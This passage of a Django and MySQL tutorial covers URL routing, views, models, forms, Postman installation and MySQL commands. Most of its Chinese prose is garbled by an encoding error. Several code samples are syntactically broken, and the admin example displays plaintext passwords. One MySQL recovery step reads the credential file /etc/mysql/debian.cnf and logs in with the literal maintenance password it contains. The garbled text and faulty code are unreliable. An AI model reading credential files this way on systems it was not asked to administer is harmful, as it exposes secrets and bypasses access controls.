éœ€è¦ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ–¹å¼ã€‚\n\n```python\nfrom django.urls import path\nfrom . import views\n\nurlpatterns = [\n    path(route='index/',view=views.index,name='index',{'foo':'bar'}),\n   \n    path('index/', views.index,name='index'),#å¯ä»¥è¿™æ ·ç®€å†™\n]\n```\n\n## äº”ã€View\n\nåœ¨ Django ä¸­ï¼Œè§†å›¾(view)å¯¹ WEB è¯·æ±‚è¿›è¡Œå›åº”ï¼Œè§†å›¾å°±æ˜¯ä¸€ä¸ª Python å‡½æ•°ï¼Œè¢«å®šä¹‰åœ¨ `views.py` ä¸­\nè§†å›¾æ¥æ”¶ reqeust å¯¹è±¡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒ…å«äº†è¯·æ±‚çš„ä¿¡æ¯\n\n```python\nfrom django.http import HttpResponse\n    def index(request):\n          return HttpResponse(\"Hello World!\")\n```\n\nè¯´æ˜ï¼š\nç¬¬äºŒè¡Œå¼•å…¥ HttpResponseï¼Œå®ƒæ˜¯ç”¨æ¥å‘ç½‘é¡µè¿”å›å†…å®¹ã€‚\n\n1. index()å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ requestï¼Œä¸ç½‘é¡µå‘æ¥çš„è¯·æ±‚æœ‰å…³ï¼Œrequest å˜é‡é‡Œé¢åŒ…å« get æˆ– post çš„å†…å®¹ï¼Œç”¨æˆ·æµè§ˆå™¨ï¼Œç³»ç»Ÿç­‰ä¿¡æ¯åœ¨é‡Œé¢ ã€‚\n2. å‡½æ•°è¿”å›äº†ä¸€ä¸ª HttpResponse å¯¹è±¡ï¼Œæœ€ç»ˆæ˜¾ç¤ºå‡ ä¸ªå­—åˆ°ç½‘é¡µä¸Šã€‚\n\n**ä½¿ç”¨renderæ–¹å¼æ¸²æŸ“æ¨¡æ¿**\n\n```python\nfrom django.shortcuts import render\n\n# å¯¼å…¥æ•°æ®æ¨¡å‹ArticlePost\nfrom .models import ArticlePost\n\ndef article_list(request):\n    # å–å‡ºæ‰€æœ‰åšå®¢æ–‡ç« \n    articles = ArticlePost.objects.all()\n    # éœ€è¦ä¼ é€’ç»™æ¨¡æ¿ï¼ˆtemplatesï¼‰çš„å¯¹è±¡\n    context = { 'articles': articles }\n    # renderå‡½æ•°ï¼šè½½å…¥æ¨¡æ¿ï¼Œå¹¶è¿”å›contextå¯¹è±¡\n    return render(request, 'article/list.html', context)\n```\n\nåˆ†æå¦‚ä¸‹ï¼š\n\n- `from .models import ArticlePost`ä»`models.py`ä¸­å¯¼å…¥`ArticlePost`æ•°æ®ç±»\n- `ArticlePost.objects.all()`æ˜¯æ•°æ®ç±»çš„æ–¹æ³•ï¼Œå¯ä»¥è·å¾—æ‰€æœ‰çš„å¯¹è±¡ï¼ˆå³åšå®¢æ–‡ç« ï¼‰ï¼Œå¹¶ä¼ é€’ç»™`articles`å˜é‡\n- `context`å®šä¹‰äº†éœ€è¦ä¼ é€’ç»™**æ¨¡æ¿**çš„ä¸Šä¸‹æ–‡ï¼Œè¿™é‡Œå³`articles`\n\n- æœ€åè¿”å›äº†`render`å‡½æ•°ã€‚å®ƒçš„ä½œç”¨æ˜¯ç»“åˆæ¨¡æ¿å’Œä¸Šä¸‹æ–‡ï¼Œå¹¶è¿”å›æ¸²æŸ“åçš„HttpResponseå¯¹è±¡ã€‚é€šä¿—çš„è®²å°±æ˜¯æŠŠcontextçš„å†…å®¹ï¼ŒåŠ è½½è¿›æ¨¡æ¿ï¼Œå¹¶é€šè¿‡æµè§ˆå™¨å‘ˆç°ã€‚\n\n`render`çš„å˜é‡åˆ†è§£å¦‚ä¸‹ï¼š\n\n- requestæ˜¯å›ºå®šçš„`request`å¯¹è±¡ï¼Œç…§ç€å†™å°±å¯ä»¥\n- `article/list.html`å®šä¹‰äº†æ¨¡æ¿æ–‡ä»¶çš„ä½ç½®ã€åç§°\n- `context`å®šä¹‰äº†éœ€è¦ä¼ å…¥æ¨¡æ¿æ–‡ä»¶çš„ä¸Šä¸‹æ–‡\n\nè§†å›¾å‡½æ•°è¿™æ ·å°±å†™å¥½äº†ã€‚\n\n## å…­ã€Model\n\n###  Field ç±»å‹\n\n| å±æ€§                       | æè¿°                                                         |\n| -------------------------- | ------------------------------------------------------------ |\n| AutoField                  | ä¸€ä¸ªè‡ªåŠ¨å¢é•¿çš„IntegerFieldï¼Œä¸€èˆ¬ä¸ç›´æ¥ä½¿ç”¨ï¼ŒDjangoä¼šè‡ªåŠ¨ç»™æ¯å¼ è¡¨æ·»åŠ ä¸€ä¸ªè‡ªå¢çš„primary key |\n| **BooleanField**           | True/Falseï¼Œé»˜è®¤çš„widget æ˜¯ CheckboxInputã€‚                  |\n| BinaryField                | å­˜å‚¨äºŒè¿›åˆ¶æ•°æ®ã€‚ä¸èƒ½ä½¿ç”¨ filter å‡½æ•°è·å¾— QuerySet            |\n| BigIntegerField            | 64ä½æ•´æ•°                                                     |\n| **CharField**              | **å­˜å‚¨å­—ç¬¦ä¸²ã€‚å¿…é¡»æœ‰max_lengthå‚æ•°æŒ‡å®šé•¿åº¦**                 |\n| CommaSeparatedIntegerField | ä¸€ä¸²ç”±é€—å·åˆ†å¼€çš„æ•´æ•°ã€‚å¿…é¡»æœ‰ max_length å‚æ•°                 |\n| DateField                  | æ—¥æœŸ                                                         |\n| DateField.auto_now         | æ¯æ¬¡æ‰§è¡Œè‡ªåŠ¨è®°å½•å½“å‰æ—¶é—´ï¼Œå¸¸ä½œä¸ºæœ€è¿‘ä¸€æ¬¡ä¿®æ”¹çš„æ—¶é—´ä½¿ç”¨       |\n| DateField.auto_now_add     | ç¬¬ä¸€æ¬¡åˆ›å»ºçš„æ—¶å€™æ·»åŠ å½“å‰æ—¶é—´ï¼Œå¸¸ä½œä¸ºåˆ›å»ºæ—¶é—´ä½¿ç”¨             |\n| DateTimeField              | æ—¥æœŸ+æ—¶é—´ å¸¸ç”¨é™„åŠ é€‰é¡¹å’ŒDateFieldä¸€æ ·ã€‚                      |\n| DecimalField               | åŒç²¾åº¦æµ®ç‚¹æ•°                                                 |\n| **EmailField**             | **åŠ ä¸Šé‚®ä»¶åœ°å€åˆæ³•æ€§éªŒè¯çš„CharFieldï¼Œä¸éœ€è¦å¼ºåˆ¶è®¾å®š max_length** |\n| FileField                  | æ–‡ä»¶ä¸Šä¼ ï¼Œä¸æ”¯æŒ primary_key å’Œ uniqueï¼Œå¦åˆ™ä¼šæŠ¥ TypeError å¼‚å¸¸ã€‚ |\n| FloatField                 | float å•ç²¾åº¦æµ®ç‚¹æ•°                                           |\n| ImageField                 | åŠ ä¸Šå›¾ç‰‡åˆæ³•æ€§éªŒè¯åŠŸèƒ½çš„FileFieldï¼Œéœ€è¦å®‰è£… PIL æˆ–è€… Pillow æ¨¡å— |\n| **IntegerField**           | æ•´æ•°ï¼Œé»˜è®¤çš„ç»„ä»¶æ˜¯TextInputã€‚                                |\n| IPAddressField             | IPåœ°å€ï¼Œå­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚ 127.0.0.1ã€‚é»˜è®¤ç»„ä»¶æ˜¯ TextInputã€‚     |\n| **TextField**              | **å¤§æ–‡æœ¬ï¼Œå·¨é•¿çš„æ–‡æœ¬ã€‚é»˜è®¤çš„ç»„ä»¶æ˜¯Textarea**                 |\n| **URLField**               | åŠ äº† URL åˆæ³•æ€§éªŒè¯çš„ CharFieldã€‚                            |\n\n### Field é€‰é¡¹\n\n| é€‰é¡¹             | æè¿°                                                         |\n| ---------------- | ------------------------------------------------------------ |\n| null             | boolean å€¼ï¼Œé»˜è®¤ä¸ºfalseã€‚TURE=å°†NULLç©ºå€¼å­˜å‚¨åˆ°æ•°æ®åº“ä¸­       |\n| **blank**        | boolean å€¼ï¼Œè¯¥å­—æ®µæ˜¯å¦å¯ä»¥ä¸ºç©ºã€‚å¦‚æœä¸ºå‡ï¼Œåˆ™å¿…é¡»æœ‰å€¼ã€‚       |\n| choices          | å…ƒç»„å€¼ï¼Œä¸€ä¸ªç”¨æ¥é€‰æ‹©å€¼çš„2ç»´å…ƒç»„ã€‚ç¬¬ä¸€ä¸ªå€¼æ˜¯å®é™…å­˜å‚¨çš„å€¼ï¼Œç¬¬äºŒä¸ªç”¨æ¥æ–¹ä¾¿è¿›è¡Œé€‰æ‹©ã€‚å¦‚SEX_CHOICES=((â€˜Fâ€™,â€™Femaleâ€™),(â€˜Mâ€™,â€™Maleâ€™),) |\n| db_column        | string å€¼ï¼ŒæŒ‡å®šå½“å‰åˆ—åœ¨æ•°æ®åº“ä¸­çš„åå­—ï¼Œä¸è®¾ç½®ï¼Œå°†è‡ªåŠ¨é‡‡ç”¨modelå­—æ®µå |\n| db_index         | boolean å€¼ï¼Œå¦‚æœä¸ºTrueå°†ä¸ºæ­¤å­—æ®µåˆ›å»ºç´¢å¼•                     |\n| **default**      | **ç»™å½“å‰å­—æ®µè®¾ç½®é»˜è®¤å€¼**                                     |\n| editable         | boolean å€¼ï¼Œå¦‚æœä¸ºfalseï¼Œadminæ¨¡å¼ä¸‹å°†ä¸èƒ½æ”¹å†™ã€‚é»˜è®¤ä¸ºtrue   |\n| error_messages   | å­—å…¸ï¼Œè®¾ç½®é»˜è®¤çš„å‡ºé”™ä¿¡æ¯                                     |\n| help_text        | adminæ¨¡å¼ä¸‹å¸®åŠ©æ–‡æ¡£ï¼Œç»„ä»¶å†…æ˜¾ç¤ºå¸®åŠ©æ–‡æœ¬ã€‚                    |\n| **primary_key**  | **è®¾ç½®å½“å‰å­—æ®µä¸ºä¸»é”®ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ä¸»é”®djangoåˆ›å»ºè¡¨æ—¶ä¼šè‡ªåŠ¨idä¸»é”®** |\n| radio_admin      | ç”¨äº admin æ¨¡å¼ä¸‹å°† select è½¬æ¢ä¸º radio æ˜¾ç¤ºã€‚               |\n| unique           | booleanå€¼ï¼ŒTrue=è¯¥å­—æ®µçš„å€¼å¿…é¡»å”¯ä¸€                           |\n| **verbose_name** | **stringç±»å‹ã€‚è®¾ç½®è¯¥å­—æ®µçš„å¦ä¸€ä¸ªåå­—**                       |\n| validators       | æœ‰æ•ˆæ€§æ£€æŸ¥ã€‚æ— æ•ˆåˆ™æŠ›å‡º django.core.validators.ValidationError å¼‚å¸¸ã€‚ |\n\n### ä½¿ç”¨å®ä¾‹\n\nåœ¨`models.py`ä¸­åˆ›å»º\n\n```python\nclass Articles(models.Model):\n    title = models.CharField(verbose_name='æ ‡é¢˜',max_length=20)\n    author = models.CharField(verbose_name='ä½œè€…',max_length=20)\n    content = models.TextField(verbose_name='å†…å®¹')\n    def __str__(self): #ä»¥titleæ˜¾ç¤º\n        return self.title\n\nclass UserInfo(models.Model):\n    choice = [('male','ç”·'),('female','å¥³')]\n    username = models.CharField(verbose_name='ç”¨æˆ·å', max_length=32)\n    mobile_phone = models.CharField(verbose_name='æ‰‹æœºå·', max_length=32)\n    password = models.CharField(verbose_name='å¯†ç ', max_length=32)\n    sex=models.CharField(verbose_name='æ€§åˆ«',choices=choice,default='male',max_length=32)\n```\n\nåœ¨admin.pyä¸­æ³¨å†Œ\n\n```python\nfrom .models import Articles\nadmin.site.register(Articles)\n\nfrom .models import UserInfo\nclass StudentsAdmin(admin.ModelAdmin):\n    list_display = ['username','mobile_phone','password','sex']\nadmin.site.register(UserInfo,StudentsAdmin)\n```\n\nç”Ÿæˆè¿ç§»æ–‡ä»¶å¹¶æ˜ å°„ï¼ŒDjangoä¼šæ ¹æ®æŒ‡å®šçš„æ•°æ®åº“è‡ªåŠ¨ç”Ÿæˆsqlè¯­å¥\n\n```bash\npython manage.py makemigrations\n\npython manage.py migrate\n```\n\nåˆ›å»ºåå°ç”¨æˆ·ï¼Œåˆ›å»ºäº†æ‰å¯ä»¥ç™»å½•åå°\n\n```bash\npython manage.py createsuperuser\n```\n\nç™»å½•åå°(127.0.0.1:8000/admin)å°±èƒ½çœ‹åˆ°åˆ›å»ºçš„Articleså’ŒUserInfo\n\n![](https://img.jwt1399.top//img/20201204103821.png)\n\n### Metaå…ƒæ•°æ®\n\n|                     å±æ€§                      |                 æè¿°                 |\n| :-------------------------------------------: | :----------------------------------: |\n|               db_table = 'xxx'                |            ä¿®æ”¹è¡¨åä¸ºxxx             |\n|               ordering  = 'xxx'               |         æŒ‰ç…§æŒ‡å®šå­—æ®µxxxæ’åº          |\n|             verbose_name = 'xxx'              |  è®¾ç½®æ¨¡å‹å¯¹è±¡çš„å¯è¯»çš„åç§°ï¼Œå•æ•°åå­—  |\n|      verbose_name_plural = verbose_name       |     è®¾ç½®verbose_nameçš„å¤æ•°ååå­—     |\n|                abstract = True                |         è®¾ç½®æ¨¡å‹ç±»ä¸ºä¸€ä¸ªåŸºç±»         |\n| permissions = (('å®šä¹‰å¥½çš„æƒé™', 'æƒé™è¯´æ˜'),) |      ç»™æ•°æ®åº“çš„è¡¨è®¾ç½®é¢å¤–çš„æƒé™      |\n|                managed = False                | æ˜¯å¦æŒ‰ç…§djangoæ—¢å®šçš„è§„åˆ™æ¥ç®¡ç†æ¨¡å‹ç±» |\n|     unique_together = ('address', 'note')     |           è”åˆå”¯ä¸€é”®ï¼Œçº¦æŸ           |\n|               app_label = 'xxx'               |       å®šä¹‰æ¨¡å‹ç±»å±äºå“ªä¸€ä¸ªåº”ç”¨       |\n|                 db_tablespace                 |        å®šä¹‰æ•°æ®åº“è¡¨ç©ºé—´çš„åå­—        |\n\nMetaä½œä¸ºæ¨¡å‹çš„å­ç±» æ³¨æ„ç¼©è¿›\n\n```python\nclass UserInfo(models.Model):\n    choice = [('male','ç”·'),('female','å¥³')]\n    username = models.CharField(verbose_name='ç”¨æˆ·å', max_length=32)\n\n    class Meta:\n        verbose_name_plural=verbose_name = 'ä¿¡æ¯'  #å°†User Infosåœ¨åå°æ˜¾ç¤ºä¸ºä¿¡æ¯\n        ordering = ['id','username'] #ä»¥idå’Œusernameæ’åº #é€†åºæ’çš„è¯åŠ ä¸ªâ€˜-â€™ eg: -id\n        db_table = 'students' #ä¿®æ”¹è¡¨æ˜ä¸ºstudentsï¼Œé»˜è®¤åä¸ºappå_ç±»å\n```\n\n![](https://img.jwt1399.top//img/20201204103843.png)\n\n## ä¸ƒã€Form\n\n### Formså­—æ®µåŸºæœ¬è¯­æ³•\n\n> `Field(required=True, widget=None, label=None, initial=None,help_text='', error_messages=None, show_hidden_initial=False,validators=(),localize=False, disabled=False, label_suffix=None)`\n>\n> required: æŒ‡å®šå­—æ®µæ˜¯å¦å¿…å¡«\n> widget : å­—æ®µæ§ä»¶\n> label : å­—æ®µåœ¨htmlä¸­æ˜¾ç¤ºçš„æ ‡ç­¾\n> initial : åˆå§‹åœ¨å­—æ®µä¸­æ˜¾ç¤ºçš„å€¼\n> help_text: åœ¨å­—æ®µåé¢æ˜¾ç¤ºå®šä¹‰çš„å¸®åŠ©æ–‡æ¡£\n> error_messages : æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé”™è¯¯æç¤ºä¿¡æ¯\n> show_hidden_initial : æ˜¾ç¤ºæˆ–éšè—åˆå§‹å€¼\n> validators : è¡¨å•éªŒè¯è§„åˆ™\n> localize : æ˜¯å¦æ”¯æŒæœ¬åœ°åŒ–\n> disabled : æ˜¯å¦å¯ç”¨\n> label_suffix : é‡å†™æ ‡ç­¾çš„å±æ€§åç¼€\n\n### Fieldç±»å‹\n\n> æ‰€æœ‰çš„å­—æ®µéƒ½ç»§æ‰¿è‡ªFieldå¯¹è±¡ã€‚\n\n- CharField\n```\nCharField(max_length=None, min_length=None, strip=True, empty_value='', **kwargs)\n```\n- IntegerField\n```\nIntegerField(max_value=None, min_value=None, **kwargs)\n```\n- BaseTemporalField\n```\nBaseTemporalField(BaseTemporalField)\n```\n- DurationField\n```\nDurationField()\n```\n- FileField\n```\nFileField(max_length=None, allow_empty_file=False, **kwargs)\n```\n- BooleanField\n```\nBooleanField()\n```\n- ChoiceField\n```\nChoiceField(choices=(),**kwargs)\n```\n- ComboField\n```\nComboField(fields,**kwargs)\n```\n- MultiValueField\n```\nMultiValueField(fields, *, require_all_fields=True, **kwargs)\n```\n### ç»§æ‰¿è‡ªFieldç±»å‹\n\n#### ç»§ç»­è‡ªCharFieldçš„å­—æ®µ\n\n- RegexField\n```\nRegexField(regex, **kwargs)\n```\n- EmailField\n```\nEmailField(**kwargs)\n```\n- URLField\n```\nURLField(**kwargs)\n```\n- GenericIPAddressField\n```\nGenericIPAddressField(protocol='both', unpack_ipv4=False, **kwargs)\n```\n- SlugField\n```\nSlugField(allow_unicode=False, **kwargs)\n```\n- UUIDField\n```\nUUIDField()\n```\n#### ç»§æ‰¿è‡ªIntegerFieldçš„å­—æ®µ\n\n- FloatField\n```\nFloatField()\n```\n- DecimalField\n```\nDecimalField(max_value=None, min_value=None, max_digits=None, decimal_places=None, **kwargs)\n```\n#### ç»§æ‰¿è‡ªBaseTemporalFieldçš„å­—æ®µ\n\n- TimeField\n```\nTimeField()\n```\n- DateTimeField\n```\nDateTimeField()\n```\n#### ç»§æ‰¿è‡ªFileFieldçš„å­—æ®µ\n\n- ImageField\n```\nImageField()\n```\n#### ç»§æ‰¿è‡ªBooleanFieldçš„å­—æ®µ\n\n- NullBooleanField\n```\nNullBooleanField()\n```\n#### ç»§æ‰¿è‡ªChoiceFieldçš„å­—æ®µ\n\n- TypedChoiceField\n```\nTypedChoiceField(coerce=lambda val: val, empty_value='', **kwargs)\n```\n- MultipleChoiceField\n```\nMultipleChoiceField()\n```\n- FilePathField\n```\nFilePathField(path, *, match=None, recursive=False, allow_files=True,\n                 allow_folders=False, **kwargs)\n```\n#### ç»§æ‰¿è‡ªChoiceFieldçš„å­—æ®µ\n\n- TypedMultipleChoiceField\n```\nTypedMultipleChoiceField(coerce=lambda val: val, **kwargs)\n```\n### widgetè¡¨å•æ§ä»¶\n\næ¯ä¸ªFiledå­—æ®µéƒ½æœ‰ä¸€ä¸ªé»˜è®¤çš„widgetç±»å‹ã€‚å¦‚æœä½ æƒ³è¦ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„Widgetï¼Œå¯ä»¥åœ¨å®šä¹‰å­—æ®µæ—¶ä½¿ç”¨widgetå‚æ•°ã€‚ åƒè¿™æ ·ï¼š\n\n```python\nfrom django import forms\n \nclass RegisterForms(forms.Form):\n\tpassword = forms.CharField(widget=forms.PasswordInput)\n```\n\n| æ§ä»¶                | æè¿°                                  |\n| ------------------- | ------------------------------------- |\n| TextInput           | å¯¹åº”HTMLä¸­çš„`<input type=\"text\"/>`    |\n| NumberInput         | æ•°å­—è¾“å…¥æ¡†(ä¸ºTextInputåŠ æ•°å­—éªŒè¯)     |\n| EmailInput          | é‚®ç®±è¾“å…¥æ¡†(ä¸ºTextInputåŠ é‚®ç®±æ ¼å¼éªŒè¯) |\n| URLInput            | urlè¾“å…¥æ¡†                             |\n| PasswordInput       | å¯†ç è¾“å…¥æ¡†                            |\n| HiddenInput         | éšè—è¾“å…¥æ¡†                            |\n| Textarea            | æ–‡æœ¬åŒºè¾“å…¥æ¡†                          |\n| DateInput           | æ—¥æœŸè¾“å…¥æ¡†                            |\n| DateTimeInut        | æ—¥æœŸæ—¶é—´è¾“å…¥æ¡†                        |\n| TimeInput           | æ—¶é—´è¾“å…¥æ¡†                            |\n| SplitDateTimeWidget | æ—¶é—´åˆ†å‰²æ¡†(ä¸¤ä¸ªinputæ¡†)               |\n| RadioSelect         | å•é€‰æ¡†                                |\n| CheckboxInput       | å¤é€‰æ¡†                                |\n| Select              | å•é€‰ä¸‹æ‹‰æ¡†   ç­‰ä»·ChoiceField          |\n| SelectMultiple      | å¤šé€‰ä¸‹æ‹‰æ¡†   ç­‰ä»·MultipleChoiceField  |\n| FileInput           | æ–‡ä»¶ä¸Šä¼                               |\n| ClearableFileInput  | å¤šæ–‡ä»¶ä¸Šä¼                             |\n\n### Formè¾“å‡ºé€‰é¡¹\n\n\n- {{ form.as_table }}ï¼šä»¥è¡¨æ ¼å½¢å¼åŠ è½½è¡¨å•å…ƒç´ \n\n- {{ form.as_p }}ï¼šä»¥æ®µè½å½¢å¼åŠ è½½è¡¨å•å…ƒç´ \n\n- {{ form.as_ul }}ï¼šä»¥åˆ—è¡¨å½¢å¼åŠ è½½è¡¨å•å…ƒç´ \n\n### ä½¿ç”¨å®ä¾‹\n\n**åœ¨`app`ä¸­æ–°å»º`forms.py`,å¹¶æ·»åŠ **\n\n```python\nfrom django import forms\nclass RegisterForms(forms.Form):\n    username = forms.CharField(min_length=4,max_length=10,label='ç”¨æˆ·å')\n    password = forms.CharField(min_length=4,max_length=10,label='å¯†ç ',widget=forms.PasswordInput)\n    age = forms.IntegerField(label='å¹´é¾„',min_value=1,max_value=120)\n    email = forms.EmailField(label='é‚®ç®±')\n    phone = forms.CharField(min_length=11, max_length=11,label='æ‰‹æœº')\n```\n\nåœ¨`view.py`æ·»åŠ \n\n```python\nfrom .forms import RegisterForms\nfrom django.views import View\nclass IndexForms(View):\n    def get(self,request):\n        forms = RegisterForms()\n        return render(request,'index.html',{'forms':forms})\n```\n\nåœ¨`url.py`ä¸­æ·»åŠ \n\n```python\npath('forms/', views.IndexForms.as_view(),name='forms'),\n```\n\nåœ¨`templates`ä¸­æ–°å»º`index.html`,å¹¶æ·»åŠ \n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Forms</title>\n</head>\n<body>\n<!--æ¸²æŸ“æˆè¡¨æ ¼-->\n<form action=\"\" method=\"post\">\n    <table>\n        {{ forms.as_table }}\n    </table>\n    <input type=\"submit\" value=\"æäº¤\">\n</form>\n\n<hr>\n<!--æ¸²æŸ“æˆæ®µè½-->\n<form action=\"\" method=\"post\">\n    {{ forms.as_p }}\n</form>\n\n<hr>\n<!--æ¸²æŸ“æˆæ ‡ç­¾-->\n<form action=\"\" method=\"post\">\n{{ forms.as_ul }}\n</form>\n</body>\n</html>\n```\n\n![Formså®ä¾‹](https://img.jwt1399.top//img/20201204103931.png)\n\n### å•é€‰ã€å¤é€‰ã€ä¸‹æ‹‰åˆ—è¡¨\n\nåœ¨`forms.py`ä¸­æ·»åŠ \n\n```python\nfrom django import forms\nclass SexChoiceForms(forms.Form):\n    choices_item=[(1,'ç”·'),(2,'å¥³'),(3,'ç§˜å¯†')] \n    sex1 = forms.ChoiceField(label='æ€§åˆ«',choices=choices_item,initial=1)#ä¸‹æ‹‰åˆ—è¡¨\n    sex2 = forms.ChoiceField(label='æ€§åˆ«', choices=choices_item,widget=forms.RadioSelect,initial=1)#å•é€‰æ¡†\n    sex3 = forms.ChoiceField(label='æ€§åˆ«', choices=choices_item,widget=forms.CheckboxSelectMultiple,initial=1)#å¤šé€‰æ¡†\n    sex4 = forms.MultipleChoiceField(label='æ€§åˆ«', choices=choices_item,initial=1)#å¤šé€‰æ¡†\n    sex5 = forms.ChoiceField(label='æ€§åˆ«', choices=choices_item,initial=1,widget=forms.Select)#ä¸‹æ‹‰åˆ—è¡¨\n    sex6 = forms.ChoiceField(label='æ€§åˆ«', choices=choices_item, initial=1, widget=forms.SelectMultiple)#å¤šé€‰æ¡†\n```\n\nå…¶ä»–é…ç½®åŒä¸Š\n\n![å•é€‰ã€å¤é€‰ã€ä¸‹æ‹‰åˆ—è¡¨](https://img.jwt1399.top//img/20201204104011.png)\n\n### Postmanå®‰è£…\n\næ‰“å¼€å®˜ç½‘ç›´æ¥ä¸‹è½½ï¼Œä¸‹è½½åè¿›å…¥ä¸‹è½½ç›®å½•è§£å‹\n\n```bash\ntar -zxvf Postman-linux-x64-7.22.1.tar.gz         \n```\n\nç„¶åæ‹·è´åˆ°`opt`ç›®å½•ä¸‹,å¹¶è¿è¡Œ\n\n```bash\n sudo cp Postman /opt/ -r \n cd /opt/Postman\n ./Postman\n```\n\nåˆ›å»ºè½¯è¿æ¥\n\n```python\nsudo ln -s /opt/Postman/Postman /usr/bin/postman\n```\n\nåˆ›å»ºå¿«æ·æ–¹å¼,åˆ›å»ºå®Œå°±èƒ½åœ¨èœå•æ‰¾åˆ°Postmanäº†\n\n```bash\n$ cat > ~/.local/share/applications/postman.desktop << EOL\nheredoc> [Desktop Entry]\nheredoc> Encoding=UTF-8                           \nheredoc> Name=Postman\nheredoc> Exec=postman\nheredoc> Icon=/opt/Postman/app/resources/app/assets/icon.png\nheredoc> Terminal=false\nheredoc> Type=Application\nheredoc> Categories=Development;\nheredoc> EOL\n```\n\n##  å…«ã€ModelForm\n\nåœ¨`forms.py`ä¸­æ·»åŠ \n\n```python\nclass ForbsForms(forms.ModelForm)\n\tclass Meta:\n        model = Forbs\n        fields = '__all__'\n```\n\nåœ¨`views.py`ä¸­æ·»åŠ \n\n```python\nclass Indexforbs(view):\n    def get(self,request):\n        forms = ForbsForms()\n        return render(request,'index.html',{'forms':forms}\n```\n\nåœ¨`urls.py`ä¸­æ·»åŠ \n\n```python\npath('',view.IndexForbs.as_view(),name='forbs')\n```\n\nç»™ModelFormåŠ å…¥cssæ ·å¼\n\n```python\npassword = forms.CharField(label='å¯†ç ',widget=forms.PasswordInput(attrs={'class':\"form-control\",'placeholder':\"è¯·è¾“å…¥å¯†ç \"}))\n```\n\n\n\n## ä¹ã€mysqlæ•°æ®åº“\n\n### linuxå®‰è£…\n\n```bash\nsudo apt-get install mysql-server #æœåŠ¡å™¨\nsudo apt-get install mysql-client #å®¢æˆ·ç«¯\n```\n\n### widows å®‰è£…\n\nè¯·å‚è€ƒï¼š[win10å®‰è£…MySqlæ•™ç¨‹](https://www.cnblogs.com/xiaokang01/p/12092160.html)\n\n### ä½¿ç”¨\n\n```mysql\n#linux\nservice mysql start            #å¯åŠ¨\nservice mysql  stop            #åœæ­¢\nservice mysql restart          #é‡å¯\n\n#windows\ncd C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin #mysqlé»˜è®¤å®‰è£…ç›®å½•\nnet start mysql80   #å¯åŠ¨ æˆ‘çš„æœåŠ¡å™¨åç§°æ˜¯MySQL80\nnet stop  mysql80   #åœæ­¢\n#æœåŠ¡å™¨åç§°æŸ¥çœ‹ï¼šæ‰“å¼€ã€æ§åˆ¶é¢æ¿ã€‘ï¼Œé€‰æ‹©ã€ç³»ç»Ÿå’Œå®‰å…¨ã€‘ï¼Œç„¶åé€‰æ‹©ã€ç®¡ç†å·¥å…·ã€‘ï¼Œå†é€‰æ‹©ã€æœåŠ¡ã€‘,æ‰¾åˆ°MySQL\n```\n\n### è¿æ¥\n\n```mysql\nsudo mysql -uroot -p \n#é»˜è®¤å¯†ç ä¸ºç©ºï¼Œå›è½¦å°±å¯ä»¥ï¼Œå¦‚æœä¸æ˜¯rootç”¨æˆ·ï¼Œå¿…é¡»åŠ sudo,ä¸åŠ ä¼šæŠ¥é”™ï¼Œåº”è¯¥ä¸ºè¿˜æ²¡è®¾rootå¯†ç ï¼Œè¿™æ˜¯ä¸ªå‘ç‚¹ï¼Œä¸‹æ­¥è®¾å®Œå°±ä¸åŠ sudo\n```\n\n**å¦‚æœå¯†ç ä¸æ­£ç¡®æˆ–å¿˜è®°å¯†ç **\n\n```bash\ncat /etc/mysql/debian.cnf \n \t#user=debian-sys-maint\n\t#password=cwgoq56yTmCFvZBh\n\t#ä½¿ç”¨è´¦å·debian-sys-maintå’Œå¯¹åº”çš„passwordå€¼è¿›è¡Œç™»å½•\n\t\nmysql -udebian-sys-maint -pcwgoq56yTmCFvZBh\n #æˆåŠŸç™»å½•è¿›mysql,ç„¶åæ‰§è¡Œä¸‹é¢æ­¥éª¤â†“ä¿®æ”¹rootå¯†ç \n```\n\n### è®¾ç½®æ•°æ®åº“rootå¯†ç \n\n```mysql\nupdate mysql.user set authentication_string=PASSWORD('ä½ çš„å¯†ç '),plugin='mysql_native_password';\n\nflush privileges;\n\nexit\n\nservice mysql start restart\n```\n\n### åˆ›å»ºæ•°æ®åº“\n\n```mysql\ncreate database my_db charset='utf8'; #æœ€å¥½ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œä¿®æ”¹ç¼–ç æ‰å¯ä»¥åœ¨æ•°æ®åº“å­˜ä¸­æ–‡\n\ncreate database my_db;\n```\n\n### åˆ é™¤æ•°æ®åº“\n\n```mysql\ndrop database my_db;\n```\n\n### å¸¸ç”¨å‘½ä»¤\n\n```mysql\nuse my_db #ä½¿ç”¨my_dbæ•°æ®åº“\nshow databases; #æ˜¾ç¤ºæ•°æ®åº“\n\nshow tables; #æ˜¾ç¤ºè¡¨\n\nselect database(); #æŸ¥çœ‹æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“\n\nshow create database my_db; #æ˜¾ç¤ºè‡ªå·±åˆ›å»ºçš„æ•°æ®åº“\nshow create table my_table; #æ˜¾ç¤ºè‡ªå·±åˆ›å»ºçš„æ•°æ®åº“\n\ndesc my_table; #æ˜¾ç¤ºè¡¨ç»“æ„\n\nshow variables like 'character_set_database'; #æŸ¥çœ‹æ•°æ®åº“ç¼–ç \nalter database my_db character set utf8; #ä¿®æ”¹æ•°æ®åº“ç¼–ç \nalter table my_tables character set utf8; #ä¿®æ”¹è¡¨ç¼–ç \n```\n\n### åˆ›å»ºè¡¨\n\n> è¯­æ³•ï¼šcreate table Table_Name (Field_Name Field_Type [condition])\n\n| **condition**  | æè¿°             |\n| -------------- | ---------------- |\n| primary key    | æ˜¯å¦æŒ‡å®šä¸ºä¸»é”®   |\n| auto_increment | æ˜¯å¦è‡ªåŠ¨å¢é•¿     |\n| default        | è®¾ç½®é»˜è®¤å€¼       |\n| unique         | å€¼æ˜¯å¦ä¸ºå”¯ä¸€çš„   |\n| Not null       | ä¸èƒ½ä¸ºç©º         